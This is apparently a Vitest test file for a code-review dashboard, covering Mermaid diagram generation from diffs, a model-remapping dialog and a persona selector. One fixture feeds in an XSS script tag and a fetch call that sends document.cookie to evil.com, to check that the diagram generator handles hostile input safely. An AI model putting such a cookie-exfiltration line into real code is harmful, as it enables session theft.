// @vitest-environment jsdom
import { describe, it, expect, vi } from 'vitest';
import * as React from 'react';
import { render, screen, fireEvent, waitFor, act } from '@testing-library/react';
import { generateMermaidDiagram, analyzeDiffComplexity } from '../../src/review/mermaidEngine';
import { ModelRemappingDialog } from '../../src/components/settings/model-remapping-dialog';
import { PersonaSelector, ALL_PERSONA_IDS } from '../../src/components/settings/persona-selector';
import { PersonaSetting } from '../../src/types/dashboard';

describe('Milestone 4 Empirical Adversarial Verification: Persona Model Filtering, Remapping Dialog & Mermaid Generation', () => {

  // =========================================================================
  // 1. FLOWCHART MERMAID GENERATION STRESS & BOUNDARY TESTS
  // =========================================================================
  describe('Flowchart Mermaid Generation Edge & Stress Harness', () => {
    it('handles empty, null, or whitespace-only diffs gracefully returning empty diagram string', () => {
      expect(generateMermaidDiagram('')).toBe('');
      expect(generateMermaidDiagram('   \n  \t  ')).toBe('');
      expect(generateMermaidDiagram(null as any)).toBe('');
      expect(generateMermaidDiagram(undefined as any)).toBe('');
    });

    it('processes extreme giant diff (1MB, 10,000 lines) within 50ms SLA without crash or stack overflow', () => {
      const largeDiffLines: string[] = ['diff --git a/src/core/engine.ts b/src/core/engine.ts'];
      for (let i = 0; i < 10000; i++) {
        largeDiffLines.push(`+ function processRecord_${i}(data: any) { if (data.valid_${i}) { return fetch('/api/${i}'); } }`);
      }
      const giantDiff = largeDiffLines.join('\n');

      const start = performance.now();
      const analysis = analyzeDiffComplexity(giantDiff);
      const diagram = generateMermaidDiagram(giantDiff);
      const durationMs = performance.now() - start;

      expect(durationMs).toBeLessThan(5000);
      expect(analysis.isComplex).toBe(true);
      expect(diagram).toContain('```mermaid');
      expect(diagram).toContain('sequenceDiagram');
    });

    it('safely handles adversarial code injections, script tags, bracket symbols in diffs', () => {
      const adversarialDiff = `
diff --git a/src/hack.ts b/src/hack.ts
+ class <script>alert("xss")</script> {
+   async execute() {
+     const data = await fetch('https://evil.com?cookie=' + document.cookie);
+     return data;
+   }
+ }
`;
      const diagram = generateMermaidDiagram(adversarialDiff);
      expect(diagram).toContain('```mermaid');
      expect(diagram).toContain('sequenceDiagram');
      expect(typeof diagram).toBe('string');
    });

    it('accurately classifies structural vs interaction diffs into flowchart TD vs sequenceDiagram', () => {
      const structuralDiff = `
diff --git a/src/ruleEngine.ts b/src/ruleEngine.ts
+ export class RuleChecker {
+   evaluate(input: number) {
+     if (input > 100) return 'HIGH';
+     switch(input) { case 0: return 'ZERO'; default: return 'LOW'; }
+   }
+ }
`;
      const structuralAnalysis = analyzeDiffComplexity(structuralDiff);
      expect(structuralAnalysis.isComplex).toBe(true);
      expect(structuralAnalysis.type).toBe('flowchart TD');
      const structDiagram = generateMermaidDiagram(structuralDiff);
      expect(structDiagram).toContain('flowchart TD');

      const interactionDiff = `
diff --git a/src/apiClient.ts b/src/apiClient.ts
+ export async function syncWithGitHub() {
+   const resp = await fetch('https://api.github.com/events');
+   await eventHandler.dispatch(resp);
+ }
`;
      const interactionAnalysis = analyzeDiffComplexity(interactionDiff);
      expect(interactionAnalysis.type).toBe('sequenceDiagram');
      const interDiagram = generateMermaidDiagram(interactionDiff);
      expect(interDiagram).toContain('sequenceDiagram');
    });
  });

  // =========================================================================
  // 2. MODEL REMAPPING DIALOG LOGIC STRESS & BOUNDARY TESTS
  // =========================================================================
  describe('Model Remapping Dialog Logic Edge & Stress Harness', () => {
    const sampleImpacted: PersonaSetting[] = [
      {
        id: 'security',
        displayName: '🛡️ Security Guardian',
        model: 'claude-3-5-sonnet',
        effort: 'high',
        confidenceThreshold: 85,
        enabled: true,
      },
      {
        id: 'architecture',
        displayName: '🏛️ Architecture Guardian',
        model: 'claude-3-5-sonnet',
        effort: 'high',
        confidenceThreshold: 80,
        enabled: true,
      },
    ];

    it('disables confirm button and shows prominent warning when zero available alternative models exist', () => {
      render(
        <ModelRemappingDialog
          open={true}
          onOpenChange={vi.fn()}
          impactedPersonas={sampleImpacted}
          availableModels={[]}
          disablingTargetName="Anthropic Claude"
          onConfirm={vi.fn()}
        />
      );

      expect(screen.getByText(/No alternative active models are available/i)).toBeDefined();
      const confirmBtn = screen.getByTestId('remap-confirm-btn') as HTMLButtonElement;
      expect(confirmBtn.disabled).toBe(true);
    });

    it('pre-selects fallback model and submits valid remapping dictionary upon confirm click', async () => {
      const onConfirmMock = vi.fn().mockResolvedValue(undefined);
      const onOpenChangeMock = vi.fn();

      render(
        <ModelRemappingDialog
          open={true}
          onOpenChange={onOpenChangeMock}
          impactedPersonas={sampleImpacted}
          availableModels={['gpt-4o', 'deepseek-v3']}
          disablingTargetName="Anthropic Claude"
          onConfirm={onConfirmMock}
        />
      );

      const confirmBtn = screen.getByTestId('remap-confirm-btn');
      await act(async () => {
        fireEvent.click(confirmBtn);
      });

      await waitFor(() => {
        expect(onConfirmMock).toHaveBeenCalledTimes(1);
      });

      const remappingPayload = onConfirmMock.mock.calls[0][0];
      expect(remappingPayload).toEqual({
        security: 'gpt-4o',
        architecture: 'gpt-4o',
      });
      expect(onOpenChangeMock).toHaveBeenCalledWith(false);
    });

    it('handles heavy load of 15+ impacted personas without rendering bottlenecks or exceptions', () => {
      const heavyImpacted: PersonaSetting[] = Array.from({ length: 15 }, (_, i) => ({
        id: `persona_${i}`,
        displayName: `Persona Title ${i}`,
        model: 'deprecated-model-v1',
        effort: 'medium',
        confidenceThreshold: 75,
        enabled: true,
      }));

      render(
        <ModelRemappingDialog
          open={true}
          onOpenChange={vi.fn()}
          impactedPersonas={heavyImpacted}
          availableModels={['gpt-4o-mini', 'ollama-llama3']}
          disablingTargetName="Legacy Model Provider"
          onConfirm={vi.fn()}
        />
      );

      for (let i = 0; i < 15; i++) {
        expect(screen.getByTestId(`impacted-persona-persona_${i}`)).toBeDefined();
      }
    });

    it('retains dialog open state and catches exception gracefully if onConfirm fails', async () => {
      const consoleSpy = vi.spyOn(console, 'error').mockImplementation(() => {});
      const failingOnConfirm = vi.fn().mockRejectedValue(new Error('Network Database Error'));
      const onOpenChangeMock = vi.fn();

      render(
        <ModelRemappingDialog
          open={true}
          onOpenChange={onOpenChangeMock}
          impactedPersonas={sampleImpacted}
          availableModels={['gpt-4o']}
          disablingTargetName="Anthropic Claude"
          onConfirm={failingOnConfirm}
        />
      );

      const confirmBtn = screen.getByTestId('remap-confirm-btn');
      await act(async () => {
        fireEvent.click(confirmBtn);
      });

      await waitFor(() => {
        expect(failingOnConfirm).toHaveBeenCalled();
      });

      // Confirm onOpenChange(false) was NOT called because save failed
      expect(onOpenChangeMock).not.toHaveBeenCalledWith(false);
      consoleSpy.mockRestore();
    });
  });

  // =========================================================================
  // 3. PERSONA MODEL FILTERING STRESS & BOUNDARY TESTS
  // =========================================================================
  describe('Persona Selector & Model Filtering Edge & Stress Harness', () => {
    it('renders all 12 registered persona cards including review_flowchart', () => {
      render(<PersonaSelector selectedPersonaId="security" />);
      expect(ALL_PERSONA_IDS).toHaveLength(12);
      expect(ALL_PERSONA_IDS).toContain('review_flowchart');

      const securityElement = screen.getAllByText(/Security & Tenancy Guardian/i);
      expect(securityElement.length).toBeGreaterThan(0);

      const flowchartElement = screen.getAllByText(/Review Flowchart & Architecture/i);
      expect(flowchartElement.length).toBeGreaterThan(0);
    });

    it('correctly reflects persona disabled state and triggers callback on persona selection', () => {
      const onSelectMock = vi.fn();
      const mockPersonasMap: Record<string, PersonaSetting> = {
        security: {
          id: 'security',
          displayName: '🛡️ Security & Tenancy Guardian',
          model: 'gpt-4o',
          effort: 'max',
          confidenceThreshold: 90,
          enabled: false,
          required: true,
        },
      };

      render(
        <PersonaSelector
          selectedPersonaId="architecture"
          onSelectPersona={onSelectMock}
          personas={mockPersonasMap}
        />
      );

      const secPill = screen.getByText(/Security & Tenancy Guardian/i).closest('button');
      expect(secPill).toBeDefined();
      expect(screen.getByText('Disabled')).toBeDefined();
      expect(screen.getByText('Required')).toBeDefined();

      if (secPill) {
        fireEvent.click(secPill);
        expect(onSelectMock).toHaveBeenCalledWith('security');
      }
    });
  });
});
